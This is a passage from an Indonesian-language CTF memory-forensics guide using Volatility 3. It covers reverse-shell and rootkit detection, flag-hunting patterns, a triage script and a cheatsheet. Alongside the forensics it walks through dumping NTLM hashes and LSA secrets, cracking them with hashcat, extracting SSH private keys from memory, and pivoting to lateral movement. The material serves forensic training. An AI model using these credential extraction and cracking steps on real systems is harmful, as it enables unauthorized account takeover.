ESTABLISHED  0       0       192.168.1.105:41204   10.0.0.99:4444      2105/nc
LISTEN       0       0       0.0.0.0:22            0.0.0.0:*           1420/sshd
```

➡️ `nc` (netcat) sedang reverse shell ke `10.0.0.99:4444`!

Bash

```
# Cek rootkit kernel module
vol -f $MEMDUMP linux.check_modules | tee ~/mem_loot/linux_modules.txt
```

**OUTPUT BERHASIL ✅ — Rootkit terdeteksi:**

text

```
Module Name   Module Address      Status
rootkit       0xffffffffa0012000  UNLINKED / HIDDEN MODULE DETECTED!
```

➡️ Ada rootkit LKM yang menyembunyikan diri!

Bash

```
# Cek capabilities (privilege escalation detection)
vol -f $MEMDUMP linux.check_creds | tee ~/mem_loot/linux_creds.txt

# Cari SSH keys di memory
strings -a $MEMDUMP | grep -A 30 "BEGIN OPENSSH PRIVATE KEY" | head -50
strings -a $MEMDUMP | grep -A 30 "BEGIN RSA PRIVATE KEY" | head -50
```

**OUTPUT BERHASIL ✅ — SSH private key:**

text

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vb...
-----END OPENSSH PRIVATE KEY-----
```

➡️ Simpan key, coba SSH ke target → **<a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>**

---

## ═══════════════════════════════════════

## FASE 4: CTF PATTERNS — CARA TERCEPAT TEMUKAN FLAG

## ═══════════════════════════════════════

### Pattern 1: Flag di Clipboard (Windows XP/7/8)

Bash

```
vol -f $MEMDUMP windows.clipboard
```

**OUTPUT BERHASIL ✅:**

text

```
Text: picoCTF{cl1pb04rd_1s_n3v3r_s4f3}
```

---

### Pattern 2: Flag di Environment Variable

Bash

```
vol -f $MEMDUMP windows.envars | grep -iE "(flag|ctf|htb|secret|key)"

# Linux
strings -a $MEMDUMP | grep -iE "^(FLAG|CTF|SECRET)=" | head -10
```

**OUTPUT BERHASIL ✅:**

text

```
PID   Process  Variable  Value
5844  cmd.exe  FLAG      HTB{3nv_v4rs_4r3_n0t_h1dd3n_1n_m3m}
```

---

### Pattern 3: Flag di PowerShell Encoded Command

Bash

```
# Cari encoded command
vol -f $MEMDUMP windows.cmdline | grep -i "enc"

# Decode (PowerShell = UTF-16LE)
B64="<base64_string_dari_output>"
python3 -c "import base64; print(base64.b64decode('$B64').decode('utf-16-le', errors='ignore'))"
```

---

### Pattern 4: Flag di File Terhapus (tapi masih di memory)

Bash

```
# Cari file
vol -f $MEMDUMP windows.filescan | grep -i "flag"

# Dump file
vol -f $MEMDUMP -o ~/mem_loot/files/ windows.dumpfiles --virtaddr <ADDRESS>
cat ~/mem_loot/files/*.dat
```

---

### Pattern 5: Flag di Bash History Linux

Bash

```
vol -f $MEMDUMP linux.bash | grep -iE "(flag|echo|cat)" | head -20
```

---

### Pattern 6: Flag di Process yang Tidak Dikenal

Bash

```
# Temukan proses aneh
grep -iE "(chall|beacon|agent|malware|evil|exploit)" ~/mem_loot/pslist.txt

# Dump dan analyze
WEIRD_PID=<PID_aneh>
vol -f $MEMDUMP -o ~/mem_loot/proc_dumps/ windows.memmap --dump --pid $WEIRD_PID
strings -a -e l ~/mem_loot/proc_dumps/pid.$WEIRD_PID.dmp | grep -iE "flag\{|HTB\{" | head -10
```

---

### Pattern 7: Flag di Process Hollow (svchost.exe dengan MZ header)

Bash

```
# Detect
vol -f $MEMDUMP windows.malfind | grep -B2 "MZ"

# Dump injected code
vol -f $MEMDUMP -o ~/mem_loot/malfind/ windows.malfind --dump

# Search flag
strings -a ~/mem_loot/malfind/pid.*.dmp | grep -iE "flag\{" | head -10
```

---

### Pattern 8: NTLM Hash → Crack → Credentials sebagai Flag

Bash

```
# Dump hash
vol -f $MEMDUMP windows.hashdump | tee ~/mem_loot/creds/hashes.txt

# Extract NT hash
awk '{print $4}' ~/mem_loot/creds/hashes.txt | grep -v "nthash" > ~/mem_loot/creds/nt_only.txt

# Crack
hashcat -m 1000 ~/mem_loot/creds/nt_only.txt /usr/share/wordlists/rockyou.txt
# ATAU cek online: crackstation.net

# Jika flag FORMAT adalah password itu sendiri
# Contoh: flag{password123!} → hash = <crack hasilnya>
```

---

### Pattern 9: Timeline Attack untuk Reconstruct Events

Bash

```
# Buat timeline manual dari timestamp
{
    echo "=== PROCESS TIMELINE ==="
    awk 'NR>1 {printf "[%s] PID:%s PPID:%s Process:%s\n",$9,$1,$2,$3}' ~/mem_loot/pslist.txt | sort
    echo "=== NETWORK TIMELINE ==="
    awk 'NR>1 {printf "[%s] PID:%s %s %s:%s -> %s:%s\n",$9,$8,$3,$4,$5,$6,$7}' ~/mem_loot/netscan.txt | sort
} | sort > ~/mem_loot/timeline.txt

cat ~/mem_loot/timeline.txt
```

**OUTPUT BERHASIL ✅ — Timeline terlihat jelas:**

text

```
[2023-10-18 14:18:30] PID:3940 PPID:1420 Process:WINWORD.EXE
[2023-10-18 14:19:01] PID:3940 ESTABLISHED 192.168.1.105:49210 -> 185.199.108.153:443
[2023-10-18 14:20:45] PID:5844 PPID:3940 Process:powershell.exe
[2023-10-18 14:20:50] PID:5844 ESTABLISHED 192.168.1.105:49300 -> 10.0.0.99:4444
[2023-10-18 14:21:02] PID:6112 PPID:5844 Process:cmd.exe
```

---

## ═══════════════════════════════════════

## FASE 5: AUTOMATION — TRIAGE SCRIPT

## ═══════════════════════════════════════

Bash

```
# Script triage otomatis
cat > ~/mem_loot/scripts/vol_triage.sh << 'SCRIPT'
#!/bin/bash
DUMP="$1"
[ -z "$DUMP" ] && echo "Usage: $0 <dump.raw>" && exit 1

OUT="vol_triage_$(date +%Y%m%d_%H%M)"
mkdir -p "$OUT"

echo "======================================================"
echo "  MEMORY TRIAGE: $DUMP"
echo "======================================================"

# OS Detection
echo "[1] Detecting OS..."
if vol -f "$DUMP" windows.info > "$OUT/info.txt" 2>&1; then
    OS="windows"
    echo "[+] Windows detected"
    grep -E "NtBuildNumber|SystemTime|Is64Bit" "$OUT/info.txt"
else
    LINUX_VER=$(strings -a "$DUMP" | grep -E "Linux version" | head -1)
    if [ -n "$LINUX_VER" ]; then
        OS="linux"
        echo "[+] Linux detected: $LINUX_VER"
    fi
fi

# Quick flag hunt
echo -e "\n[2] Quick Flag Hunt..."
FLAGS=$(strings -a -e l "$DUMP" | grep -iE "(flag|picoCTF|HTB|THM)\{[a-zA-Z0-9_!@#$%^&*-]+\}")
[ -n "$FLAGS" ] && echo "[!!] FLAGS FOUND: $FLAGS" || echo "[-] No plaintext flags"

if [ "$OS" == "windows" ]; then
    echo -e "\n[3] Windows Analysis..."
    vol -f "$DUMP" windows.pslist > "$OUT/pslist.txt" 2>&1
    vol -f "$DUMP" windows.pstree > "$OUT/pstree.txt" 2>&1
    vol -f "$DUMP" windows.cmdline > "$OUT/cmdline.txt" 2>&1
    vol -f "$DUMP" windows.netscan > "$OUT/netscan.txt" 2>&1
    vol -f "$DUMP" windows.hashdump > "$OUT/hashdump.txt" 2>&1
    vol -f "$DUMP" windows.clipboard > "$OUT/clipboard.txt" 2>&1
    vol -f "$DUMP" windows.envars > "$OUT/envars.txt" 2>&1
    vol -f "$DUMP" windows.filescan | grep -iE "flag|secret|pass" > "$OUT/files_interest.txt" 2>&1

    # Anomaly detection
    echo -e "\n[4] Anomaly Detection..."
    echo "Encoded PowerShell:"
    grep -iE "(-enc|-EncodedCommand)" "$OUT/cmdline.txt" | head -5
    echo "Active Connections:"
    grep "ESTABLISHED" "$OUT/netscan.txt" | head -10
    echo "NTLM Hashes:"
    cat "$OUT/hashdump.txt" | head -5
    echo "Clipboard:"
    cat "$OUT/clipboard.txt" | head -5

elif [ "$OS" == "linux" ]; then
    echo -e "\n[3] Linux Analysis..."
    vol -f "$DUMP" linux.pslist > "$OUT/linux_pslist.txt" 2>&1
    vol -f "$DUMP" linux.bash > "$OUT/linux_bash.txt" 2>&1
    vol -f "$DUMP" linux.netstat > "$OUT/linux_netstat.txt" 2>&1
    vol -f "$DUMP" linux.check_modules > "$OUT/linux_modules.txt" 2>&1

    echo "Bash History:"
    cat "$OUT/linux_bash.txt" | head -20
    echo "Network Connections:"
    grep "ESTABLISHED" "$OUT/linux_netstat.txt"
fi

echo -e "\n======================================================"
echo "  Triage done! Results in: $OUT"
echo "======================================================"
SCRIPT

chmod +x ~/mem_loot/scripts/vol_triage.sh
bash ~/mem_loot/scripts/vol_triage.sh $MEMDUMP
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`No suitable address space mapping`|Format tidak dikenal / corrupt|Cek magic bytes: `xxd dump.raw|
|`Unsatisfied requirement WindowsInfo`|Symbol tidak ada|Download symbol: `wget https://downloads.volatilityfoundation.org/volatility3/symbols/windows.zip`|
|`No suitable kernel found` (Linux)|Symbol Linux tidak ada|Buat dengan dwarf2json atau download dari isf-server.techanarchy.net|
|`ImportError: cannot import name`|Python dependency rusak|`pip3 install --upgrade volatility3 pefile capstone yara-python`|
|`windows.pslist` kosong|DKOM rootkit|Gunakan `windows.psscan` sebagai alternatif|
|Plugin syntax error|Pakai format Volatility 2|Ganti ke: `windows.pslist` bukan `pslist`|
|Volatility freeze / OOM|Dump terlalu besar|`nice -n 19 vol ...` atau tambah swap: `sudo fallocate -l 8G /swapfile2 && sudo mkswap /swapfile2 && sudo swapon /swapfile2`|
|`dumpfiles` hasil kosong (0 bytes)|Page di-swap out|Gunakan `foremost -i dump.raw -t txt,pdf -o ./carved/`|
|`windows.hashdump` error SAM/SYSTEM|Hive tidak termuat|`windows.registry.hivelist` lalu tambah `--hive-offset`|
|`windows.clipboard` kosong|Windows 10/11|Dump explorer.exe memory lalu search strings|
|`linux.bash` kosong|History sudah di-clear|`strings -a $MEMDUMP|

---

## MASTER DECISION TREE (RINGKASAN)

text

```
START: File Memory Dump Diterima
│
├─ FASE 0: Identifikasi
│   ├─ file / xxd → format dump
│   ├─ windows.info → Windows OS
│   └─ strings | grep "Linux version" → Linux OS
│
├─ FASE 1: Quick Flag Hunt (WAJIB DULU!)
│   └─ strings -a -e l dump | grep "flag{" → jika ketemu, SELESAI
│
├─ FASE 2: Windows Analysis
│   ├─ pslist + pstree → identifikasi proses anomali
│   ├─ psscan vs pslist → hidden process (rootkit DKOM)
│   ├─ cmdline → decode base64 PowerShell payload
│   ├─ netscan → reverse shell C2 IP:port
│   ├─ filescan + dumpfiles → extract file dari memory
│   ├─ hashdump + lsadump → extract credentials
│   ├─ malfind → process hollowing / injection
│   └─ clipboard + envars → flag tersembunyi
│
├─ FASE 3: Linux Analysis
│   ├─ Setup symbol (dwarf2json / download)
│   ├─ linux.bash → bash history dari RAM (sering ada flag!)
│   ├─ linux.netstat → reverse shell detection
│   ├─ linux.check_modules → rootkit LKM
│   └─ linux.check_creds → privilege escalation
│
├─ FASE 4: CTF Patterns
│   ├─ Clipboard → windows.clipboard
│   ├─ EnvVar → windows.envars | grep FLAG
│   ├─ PS Encoded → cmdline | decode base64
│   ├─ Deleted file → filescan + dumpfiles
│   └─ Process dump → memmap --dump --pid + strings
│
└─ Credentials Found → Pivot ke service lain
    ├─ NTLM hash → crack → SMB/RDP/WinRM → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
    ├─ SSH key → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
    └─ Plaintext pass → test ke semua service
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export MEMDUMP="challenge.raw"
mkdir -p ~/mem_loot/{dumps,creds,files,strings,malfind}
alias vol='volatility3'

# === QUICK FLAG HUNT ===
strings -a $MEMDUMP | grep -iE "(flag|CTF|HTB)\{" | head -20
strings -a -e l $MEMDUMP | grep -iE "flag\{" | head -20

# === OS DETECTION ===
vol -f $MEMDUMP windows.info
strings -a $MEMDUMP | grep "Linux version" | head -1

# === WINDOWS TRIAGE ===
vol -f $MEMDUMP windows.pslist
vol -f $MEMDUMP windows.pstree
vol -f $MEMDUMP windows.psscan            # hidden process
vol -f $MEMDUMP windows.cmdline
vol -f $MEMDUMP windows.netscan | grep ESTABLISHED
vol -f $MEMDUMP windows.filescan | grep -iE "flag|secret"
vol -f $MEMDUMP windows.hashdump
vol -f $MEMDUMP windows.lsadump
vol -f $MEMDUMP windows.malfind
vol -f $MEMDUMP windows.clipboard
vol -f $MEMDUMP windows.envars | grep -iE "FLAG|SECRET"

# === WINDOWS FILE EXTRACT ===
vol -f $MEMDUMP -o ~/mem_loot/files/ windows.dumpfiles --virtaddr <ADDR>
vol -f $MEMDUMP -o ~/mem_loot/proc_dumps/ windows.memmap --dump --pid <PID>

# === WINDOWS DECODE POWERSHELL ===
B64="<encoded_base64>"
python3 -c "import base64; print(base64.b64decode('$B64').decode('utf-16-le', errors='ignore'))"

# === LINUX TRIAGE ===
vol -f $MEMDUMP linux.pslist
vol -f $MEMDUMP linux.bash              # KRITIS: bash history dari RAM
vol -f $MEMDUMP linux.netstat | grep ESTABLISHED
vol -f $MEMDUMP linux.check_modules     # rootkit detection
vol -f $MEMDUMP linux.check_creds       # privesc detection
vol -f $MEMDUMP linux.malfind

# === CRACK NTLM ===
hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt
# Online: crackstation.net

# === AUTOMATION ===
bash ~/mem_loot/scripts/vol_triage.sh $MEMDUMP
```

---

> **➡️ NEXT:** Setelah memory forensics selesai dan credentials/artifacts ditemukan, lanjut ke:
> 
> - **Hash NTLM ditemukan** → **`<a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>`** untuk lateral movement
> - **SSH key ditemukan** → **`<a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>`**
> - **C2 IP ditemukan** → Cross-reference dengan **`<a href="/docs/pcap-analysis" class="text-[#00b4d8] hover:underline font-mono font-semibold">57_pcap_analysis_workflow.md</a>`** untuk rekonstruksi traffic
> - **Cloud artifacts** → **`<a href="/docs/cloud-enum" class="text-[#00b4d8] hover:underline font-mono font-semibold">59_cloud_enum_workflow.md</a>`**